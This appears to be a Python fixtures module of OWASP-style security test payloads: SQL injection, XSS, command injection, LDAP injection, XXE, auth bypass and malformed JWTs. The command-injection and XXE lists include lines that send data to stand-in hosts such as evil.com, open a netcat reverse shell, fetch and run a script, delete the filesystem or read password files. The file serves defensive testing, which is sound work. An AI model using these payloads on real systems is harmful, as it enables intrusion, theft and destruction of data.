"""
OWASP Security Test Fixtures

Provides security testing payloads and utilities following OWASP guidelines.
Includes payload databases for:
- SQL Injection
- XSS (Cross-Site Scripting)
- Command Injection
- LDAP Injection
- XXE (XML External Entity)
- Authentication Bypass
- JWT Manipulation
"""

from datetime import UTC, datetime, timedelta

from jose import jwt


class OWASPSecurityTestFixtures:
    """Security test fixtures following OWASP guidelines"""

    # OWASP payload databases
    SQL_INJECTION_PAYLOADS = [
        "admin'--",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "' OR 1=1--",
        "' OR '1'='1",
        "1' OR '1'='1",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' union select 1,user()#",
        "' union select null,null,null,null,null,null,null,null,null,null--",
        "'; exec sp_configure 'show advanced options', 1--",
        "'; exec sp_configure 'xp_cmdshell', 1--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "'; DROP TABLE users; --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror='alert(1)'>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "'-alert('XSS')-'",
        "\";alert('XSS');//",
        "</script><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",  # Base64 encoded alert(1)
        "<svg/onload=alert(/XSS/)>",
        "<iframe src=javascript:alert(1)></iframe>",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "; cat /etc/shadow",
        "| whoami",
        "; rm -rf /",
        "& format c:",
        "; curl http://evil.com/steal?data=$(whoami)",
        "| nc -e /bin/sh attacker.com 4444",
        "; wget http://evil.com/malware.sh && sh malware.sh",
        "$(curl http://evil.com)",
        "`id`",
        "${jndi:ldap://evil.com/exp}",  # Log4Shell
        "{{7*7}}",  # Template injection
        "${7*7}",  # Template injection
        "#{7*7}",  # Template injection
    ]

    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*",
        "*)(|(uid=*",
        "*)(&(uid=*",
        "admin)(&(password=*))",
        "admin))(|(uid=*",
        "*))(|(objectClass=*",
        "*))%00",
        "admin)(&(password=*))",
        "*)(|(mail=*))",
        "*)(|(sn=*))",
    ]

    XXE_PAYLOADS = [
        """<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
        <root>&test;</root>""",
        """<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY test SYSTEM 'http://evil.com/evil.dtd'>]>
        <root>&test;</root>""",
        """<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
        %ext;
        ]>
        <root></root>""",
    ]

    AUTHENTICATION_BYPASS_PAYLOADS = [
        {"username": "admin", "password": ""},
        {"username": "", "password": ""},
        {"username": "admin", "password": None},
        {"username": None, "password": "password"},
        {"username": "admin'--", "password": "any"},
        {"username": "admin'/*", "password": "any"},
        {"username": "admin' OR '1'='1", "password": "any"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "admin", "password": "admin'--"},
    ]

    @staticmethod
    def generate_jwt_bomb() -> str:
        """Generate JWT token with extremely large payload (Zip bomb style)"""
        large_payload = {
            "sub": "test-user",
            "exp": (datetime.now(UTC) + timedelta(hours=1)).timestamp(),
            "data": "x" * 100000,  # 100KB of data
        }
        return jwt.encode(large_payload, "secret", algorithm="HS256")

    @staticmethod
    def generate_malformed_jwt_tokens() -> list[str]:
        """Generate various malformed JWT tokens for security testing"""
        return [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",  # Missing payload and signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.",  # Missing payload and signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..",  # Missing payload
            "header.payload",  # Missing signature
            "header.payload.signature.extra",  # Too many parts
            "not-a-jwt-token",
            "",
            "null",
            "undefined",
            "false",
            "0",
            "[]",
            "{}",
            "\x00\x01\x02\x03",  # Binary data
            "ä£¤¥¦§¨©ª",  # Non-ASCII characters
            "a" * 10000,  # Extremely long string
        ]

    @staticmethod
    def generate_timing_attack_passwords() -> list[str]:
        """Generate passwords for timing attack testing"""
        # Passwords of varying lengths to test for timing differences
        return [
            "a",
            "ab",
            "abc",
            "abcd",
            "abcde",
            "abcdef",
            "abcdefg",
            "abcdefgh",
            "abcdefghi",
            "abcdefghij",
            "correct_password",
            "correct_password_but_longer",
            "x" * 100,
            "x" * 1000,
        ]
